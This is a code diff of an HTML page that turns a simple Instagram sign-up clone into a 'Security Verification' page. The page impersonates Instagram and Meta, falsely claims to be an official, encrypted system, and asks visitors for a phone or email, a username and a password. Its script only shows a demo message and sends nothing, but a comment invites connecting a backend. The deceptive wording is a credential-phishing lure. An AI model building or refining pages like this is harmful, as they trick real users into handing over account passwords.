@@ -1,347 +1,296 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-
-<title>Instagram Sign Up</title>
-
+<meta charset="UTF-8">
+<title>Instagram — Sign Up</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-
 <style>
+  :root{
+    --ink:#1b1730;
+    --plum:#5b3a8e;
+    --coral:#ff6f59;
+    --amber:#ffb648;
+    --paper:#fbf7f2;
+    --line:#e6ddd2;
+    --muted:#8a8092;
+    --boxbg:#f3eefb;
+  }
 
-*{
-    box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
-}
+  *{ box-sizing:border-box; }
 
-
-body{
-
+  body{
     margin:0;
     min-height:100vh;
-
-    padding:20px;
-
-    background:#fafafa;
-
+    padding:32px 16px;
+    background:linear-gradient(160deg, #fdf3ec, #f6f0fb);
+    font-family:'Helvetica Neue', Arial, sans-serif;
+    color:var(--ink);
     display:flex;
     justify-content:center;
     align-items:center;
+  }
 
-}
-
-
-.container{
-
+  .card{
     width:100%;
-    max-width:350px;
-
-}
-
-
-.card{
-
-    background:white;
-
-    border:1px solid #dbdbdb;
-
-    padding:35px 40px;
-
+    max-width:420px;
+    background:#fff;
+    border-radius:20px;
+    padding:40px 36px 0;
     text-align:center;
+    box-shadow:0 8px 30px rgba(91,58,142,0.08);
+    overflow:hidden;
+  }
 
-}
+  .brand{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:34px;
+  }
 
+  .brand-icon{
+    width:34px;
+    height:34px;
+    border-radius:10px;
+    background:linear-gradient(135deg, var(--amber), var(--coral), var(--plum));
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
+    font-family:Georgia, serif;
+    font-style:italic;
+    font-weight:700;
+    font-size:18px;
+  }
 
-.logo{
+  .brand-name{
+    font-family:Georgia, serif;
+    font-style:italic;
+    font-weight:700;
+    font-size:26px;
+  }
 
-    font-size:42px;
+  .emblem{
+    width:120px;
+    height:120px;
+    margin:0 auto 28px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
 
-    font-weight:bold;
+  .emblem svg{ width:100%; height:100%; }
 
-    font-family:cursive;
+  h1{
+    font-size:26px;
+    line-height:1.25;
+    margin:0 0 14px;
+  }
 
-    margin-bottom:25px;
+  .lead{
+    font-size:14.5px;
+    color:var(--muted);
+    line-height:1.6;
+    margin:0 auto 26px;
+    max-width:320px;
+  }
 
-}
+  .info-box{
+    background:var(--boxbg);
+    border-radius:14px;
+    padding:20px 20px 22px;
+    text-align:left;
+    display:flex;
+    gap:14px;
+    margin-bottom:24px;
+  }
 
+  .info-icon{
+    flex:0 0 36px;
+    width:36px;
+    height:36px;
+    border-radius:10px;
+    background:var(--plum);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
 
+  .info-icon svg{ width:18px; height:18px; }
 
-input{
+  .info-title{
+    font-size:14px;
+    font-weight:700;
+    color:var(--plum);
+    margin:0 0 4px;
+  }
 
-    width:100%;
+  .info-text{
+    font-size:13px;
+    color:var(--ink);
+    line-height:1.55;
+    margin:0;
+  }
 
-    padding:12px;
+  .learn-more{
+    font-size:13.5px;
+    color:var(--muted);
+    line-height:1.6;
+    margin-bottom:22px;
+  }
 
-    margin:6px 0;
-
-    border:1px solid #dbdbdb;
-
-    border-radius:4px;
-
-    background:#fafafa;
-
-}
-
-
-
-button{
-
-    width:100%;
-
-    margin-top:15px;
-
-    padding:10px;
-
-    border:none;
-
-    border-radius:8px;
-
-    background:#0095f6;
-
-    color:white;
-
-    font-weight:bold;
-
-    cursor:pointer;
-
-}
-
-
-
-.divider{
-
-    margin:20px;
-
-    color:#777;
-
-}
-
-
-
-.facebook{
-
-    color:#385185;
-
-    font-weight:bold;
-
-}
-
-
-
-.small-box{
-
-    margin-top:10px;
-
-    background:white;
-
-    border:1px solid #dbdbdb;
-
-    padding:20px;
-
-    text-align:center;
-
-}
-
-
-a{
-
-    color:#0095f6;
-
+  .learn-more a{
+    color:var(--plum);
+    font-weight:600;
     text-decoration:none;
+  }
 
-}
+  .cta{
+    display:block;
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:linear-gradient(100deg, var(--amber), var(--coral), var(--plum));
+    color:#fff;
+    font-size:15px;
+    font-weight:700;
+    cursor:pointer;
+    text-decoration:none;
+    margin-bottom:0;
+  }
 
+  .cta:hover{ filter:brightness(1.04); }
 
-@media(max-width:400px){
+  form{
+    text-align:left;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+    margin-bottom:0;
+  }
 
-    .card{
+  input{
+    width:100%;
+    padding:13px 14px;
+    border:1px solid var(--line);
+    border-radius:10px;
+    background:var(--paper);
+    font-size:14px;
+    color:var(--ink);
+  }
 
-        padding:25px 20px;
+  input:focus{
+    outline:2px solid var(--plum);
+    outline-offset:1px;
+    background:#fff;
+  }
 
-    }
+  button.cta{
+    border:none;
+    font-family:inherit;
+    margin-top:4px;
+  }
 
+  .status{
+    min-height:16px;
+    font-size:12px;
+    color:#2e8b57;
+    text-align:center;
+    margin-top:2px;
+  }
 
-    .logo{
+  .footer{
+    margin:26px -36px 0;
+    padding:18px 0;
+    border-top:1px solid var(--line);
+    text-align:center;
+    font-size:13px;
+    color:var(--muted);
+  }
 
-        font-size:36px;
+  .footer span{
+    font-weight:700;
+    color:var(--ink);
+  }
 
-    }
-
-}
-
-
+  @media(max-width:420px){
+    .card{ padding:30px 24px 0; }
+    .footer{ margin:24px -24px 0; }
+    .emblem{ width:96px; height:96px; }
+  }
 </style>
-
 </head>
-
-
 
 <body>
 
-
-
-<div class="container">
-
-
-
 <div class="card">
 
+  <div class="brand">
+    <div class="brand-icon">i</div>
+    <div class="brand-name">Instagram</div>
+  </div>
 
+  <div class="emblem">
+    <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="g1" x1="0" y1="0" x2="120" y2="120">
+          <stop offset="0%" stop-color="#ffb648"/>
+          <stop offset="50%" stop-color="#ff6f59"/>
+          <stop offset="100%" stop-color="#5b3a8e"/>
+        </linearGradient>
+      </defs>
+      <circle cx="60" cy="60" r="54" stroke="url(#g1)" stroke-width="5" fill="none"/>
+      <text x="60" y="78" text-anchor="middle" font-family="Georgia, serif" font-style="italic" font-weight="700" font-size="52" fill="url(#g1)">io</text>
+    </svg>
+  </div>
 
-<div class="logo">
-Instagram
-</div>
+  <h1>Security Verification- Spacing and Link Update</h1>
 
+  <p class="lead">
+    To keep your account safe,we regularly verify activity and update our security systems. Please check your credentials to continue using instagram.
+  </p>
 
+  <div class="info-box">
+    <div class="info-icon">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L4 5V11C4 16 7.5 19.5 12 21C16.5 19.5 20 16 20 11V5L12 2Z" stroke="white" stroke-width="1.6"/>
+      </svg>
+    </div>
+    <div>
+      <p class="info-title">Your data safety is our priority</p>
+      <p class="info-text">This verification is secure and handled through instagram's official systems.Your information is encrepted and protected at every step.From Instagram official documented update page.info.</p>
+    </div>
+  </div>
 
+  <p class="learn-more">
+    Want the details? <a href="#">Learn more about our security practices and how we protect your data </a>.
+  </p>
 
-<h3>
-Sign up to for checking your credentials.
-</h3>
+  <form id="signupForm">
+    <input id="number" type="tel" placeholder="Mobile number or email" autocomplete="tel" required>
+    <input id="username" type="text" placeholder="Username" autocomplete="username" required>
+    <input id="password" type="password" placeholder="Password" autocomplete="new-password" minlength="8" required>
+    <button type="submit" class="cta">Sign up</button>
+    <div class="status" id="status"></div>
+  </form>
 
-
-
-
-<form id="signupForm">
-
-
-
-<input
-
-id="number"
-
-type="text"
-
-placeholder="Mobile number"
-
-required
-
->
-
-
-
-
-<input
-
-id="e-mail"
-
-type="email"
-
-placeholder="e-mail"
-
-required
-
->
-
-
-
-
-<input
-
-id="username"
-
-type="text"
-
-placeholder="Username"
-
-required
-
->
-
-
-
-
-<input
-
-id="password"
-
-type="password"
-
-placeholder="Password"
-
-required
-
->
-
-
-
-
-<button type="submit">
-
-Sign up
-
-</button>
-
-
-
-</form>
-
-
-
-
-
-<div class="divider">
-
-OR
+  <div class="footer">
+    <span>Meta</span> — All rights are reserved under meta.ai accounts official platform
+  </div>
 
 </div>
 
-
-
-
-
-<div class="facebook">
-
-Log in with Facebook
-
-</div>
-
-
-
-
-
-<p>
-
-By signing up, you agree to our Terms, Privacy Policy.
-
-</p>
-
-
-
-</div>
-
-
-
-
-
-
-<div class="small-box">
-
-
-Have an account?
-
-
-<a href="#">
-
-Log in
-
-</a>
-
-
-</div>
-
-
-
-</div>
-
-
-
-
-
-<script src="script.js"></script>
-
+<script>
+  document.getElementById('signupForm').addEventListener('submit', function(e){
+    e.preventDefault();
+    // Replace with a real call to your backend, e.g.:
+    // fetch('/api/signup', { method: 'POST', body: new FormData(this) })
+    document.getElementById('status').textContent = 'Account created (demo only — connect this to your backend).';
+  });
+</script>
 
 </body>
-
 </html>
